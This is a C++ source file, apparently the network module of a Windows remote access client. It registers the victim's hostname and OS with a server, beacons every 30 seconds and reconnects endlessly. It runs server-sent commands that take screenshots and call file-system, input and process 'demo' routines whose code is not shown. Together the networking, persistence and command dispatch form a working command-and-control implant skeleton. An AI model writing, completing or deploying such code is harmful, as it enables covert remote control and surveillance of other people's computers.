#include "network.h"
#include "screenshot_demo.h"
#include "fs_demo.h"
#include "input_demo.h"
#include "process_demo.h"

#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>

#include <chrono>
#include <sstream>
#include <stdexcept>
#include <string>
#include <thread>

namespace {

static std::string g_client_id = "";

void log_debug(const std::string& message) {
    std::string line = message + "\r\n";
    OutputDebugStringA(line.c_str());
}

std::runtime_error make_winsock_error(const std::string& message) {
    return std::runtime_error(message + " WSAError=" + std::to_string(WSAGetLastError()));
}

void set_socket_timeouts(SOCKET sock) {
    const DWORD timeoutMs = 5000;
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, reinterpret_cast<const char*>(&timeoutMs), sizeof(timeoutMs));
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, reinterpret_cast<const char*>(&timeoutMs), sizeof(timeoutMs));
}

void send_all(SOCKET sock, const std::string& payload) {
    int totalSent = 0;
    const int payloadSize = static_cast<int>(payload.size());
    while (totalSent < payloadSize) {
        const int sent = send(sock, payload.data() + totalSent, payloadSize - totalSent, 0);
        if (sent == SOCKET_ERROR) throw make_winsock_error("Failed to send payload.");
        totalSent += sent;
    }
}

void send_raw_string(SOCKET sock, const std::string& message) {
    const std::string payload = message + "\n";
    send_all(sock, payload);
    log_debug("[NET] Raw string sent: " + message);
}

bool recv_once(SOCKET sock, std::string& response, bool allowTimeout) {
    char buffer[1024] = {};
    const int received = recv(sock, buffer, sizeof(buffer) - 1, 0);
    if (received > 0) {
        response.assign(buffer, received);
        return true;
    }
    if (received == 0) throw std::runtime_error("Server closed the TCP connection.");
    const int error = WSAGetLastError();
    if (allowTimeout && error == WSAETIMEDOUT) return false;
    throw std::runtime_error("Failed to receive server response. WSAError=" + std::to_string(error));
}

std::string json_escape(const std::string& value) {
    std::string escaped;
    escaped.reserve(value.size());
    for (char ch : value) {
        switch (ch) {
            case '\\': escaped += "\\\\"; break;
            case '"': escaped += "\\\""; break;
            case '\r': escaped += "\\r"; break;
            case '\n': escaped += "\\n"; break;
            case '\t': escaped += "\\t"; break;
            default: escaped += ch; break;
        }
    }
    return escaped;
}

// Теперь process_server_line принимает SOCKET sock
void process_server_line(const std::string& line, SOCKET sock) {
    if (line.empty()) return;

    // Получение client_id
    if (line.rfind("{\"type\":\"id\"", 0) == 0) {
        size_t pos = line.find("\"client_id\":\"");
        if (pos != std::string::npos) {
            pos += 13;
            size_t end = line.find("\"", pos);
            if (end != std::string::npos) {
                g_client_id = line.substr(pos, end - pos);
                log_debug("[NET] Received client_id: " + g_client_id);
            }
        }
        return;
    }

    if (line == "ACK") {
        log_debug("[NET] ACK received.");
        return;
    }

    // Обработка команд от сервера
    if (line == "ping") {
        send_raw_string(sock, "pong");
        log_debug("[CMD] Executed ping -> pong");
        return;
    }
    if (line == "screenshot") {
        capture_screenshot_demo();
        send_raw_string(sock, "screenshot saved");
        log_debug("[CMD] Screenshot taken");
        return;
    }
    // Обработка команды fs (файловый менеджер)
    if (line == "fs") {
        fs_demo();   // функция из fs_demo.h
        send_raw_string(sock, "fs demo completed, check fs_demo.txt");
        log_debug("[CMD] File system demo executed");
        return;
    }
    // Обработка команды input (демо ввода)
    if (line == "input") {
        input_demo();   // функция из input_demo.h
        send_raw_string(sock, "input demo completed, check input_demo.txt");
        log_debug("[CMD] Input demo executed");
        return;
    }
    // Обработка команды process (демо процесса)
    if (line == "process") {
        process_demo();   // функция из process_demo.h
        send_raw_string(sock, "process demo completed, check process_demo.txt");
        log_debug("[CMD] Process demo executed");
        return;
    }

    if (!line.empty() && line.front() == '{') {
        log_debug("[NET] Structured response: " + line);
        return;
    }

    log_debug("[SERVER MSG] " + line);
}

// process_server_payload тоже принимает SOCKET
void process_server_payload(const std::string& payload, SOCKET sock) {
    std::istringstream stream(payload);
    std::string line;
    while (std::getline(stream, line)) {
        if (!line.empty() && line.back() == '\r') line.pop_back();
        process_server_line(line, sock);
    }
}

} // namespace

bool initialize_winsock() {
    WSADATA data = {};
    return WSAStartup(MAKEWORD(2, 2), &data) == 0;
}

void cleanup_winsock() {
    WSACleanup();
}

SOCKET connect_to_server(const char* server_ip, int port) {
    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) throw make_winsock_error("Failed to create TCP socket.");

    try {
        sockaddr_in serverAddress = {};
        serverAddress.sin_family = AF_INET;
        serverAddress.sin_port = htons(static_cast<u_short>(port));
        if (inet_pton(AF_INET, server_ip, &serverAddress.sin_addr) != 1)
            throw std::runtime_error("Invalid IPv4 address: " + std::string(server_ip));

        set_socket_timeouts(sock);
        log_debug("[NET] Connecting to " + std::string(server_ip) + ":" + std::to_string(port));
        if (connect(sock, reinterpret_cast<const sockaddr*>(&serverAddress), sizeof(serverAddress)) == SOCKET_ERROR)
            throw make_winsock_error("Failed to connect to TCP server.");

        send_all(sock, "HELLO");
        log_debug("[NET] Hello sent.");
        return sock;
    } catch (...) {
        closesocket(sock);
        throw;
    }
}

bool send_register(SOCKET sock, const char* hostname, const char* os) {
    const std::string payload =
        "{\"type\":\"register\",\"hostname\":\"" + json_escape(hostname) +
        "\",\"os\":\"" + json_escape(os) + "\"}\n";

    send_all(sock, payload);
    log_debug("[NET] Register sent: " + payload);

    std::string response;
    if (recv_once(sock, response, true)) {
        process_server_payload(response, sock);  // передаём sock
    } else {
        log_debug("[NET] Register response timeout.");
    }
    return true;
}

void heartbeat_loop(SOCKET sock, const char* server_ip, int port) {
    SOCKET currentSocket = sock;
    while (true) {
        try {
            std::string beatPayload = "{\"type\":\"beat\"";
            if (!g_client_id.empty()) {
                beatPayload += ",\"client_id\":\"" + g_client_id + "\"";
            }
            beatPayload += "}\n";
            send_all(currentSocket, beatPayload);
            log_debug("[NET] Heartbeat sent.");

            std::string response;
            if (recv_once(currentSocket, response, false)) {
                process_server_payload(response, currentSocket);  // передаём сокет
            }
            std::this_thread::sleep_for(std::chrono::seconds(30));
        } catch (const std::exception& exception) {
            log_debug(std::string("[NET] Connection lost: ") + exception.what());
            if (currentSocket != INVALID_SOCKET) {
                closesocket(currentSocket);
                currentSocket = INVALID_SOCKET;
            }
            while (currentSocket == INVALID_SOCKET) {
                log_debug("[NET] Reconnecting in 10 seconds...");
                std::this_thread::sleep_for(std::chrono::seconds(10));
                try {
                    currentSocket = connect_to_server(server_ip, port);
                    log_debug("[NET] Reconnected successfully.");
                } catch (const std::exception& reconnectException) {
                    log_debug(std::string("[NET] Reconnect attempt failed: ") + reconnectException.what());
                }
            }
        }
    }
}

std::string get_hostname() {
    char buffer[MAX_COMPUTERNAME_LENGTH + 1] = {};
    DWORD size = MAX_COMPUTERNAME_LENGTH + 1;
    if (!GetComputerNameA(buffer, &size)) throw std::runtime_error("Failed to read computer name.");
    return std::string(buffer, size);
}

std::string get_os_version() {
    OSVERSIONINFOEXA versionInfo = {};
    versionInfo.dwOSVersionInfoSize = sizeof(versionInfo);
#pragma warning(push)
#pragma warning(disable: 4996)
    const BOOL versionReadOk = GetVersionExA(reinterpret_cast<OSVERSIONINFOA*>(&versionInfo));
#pragma warning(pop)
    if (!versionReadOk) throw std::runtime_error("Failed to read OS version.");
    return "Windows " + std::to_string(versionInfo.dwMajorVersion) + "." +
           std::to_string(versionInfo.dwMinorVersion) + " build " +
           std::to_string(versionInfo.dwBuildNumber);
}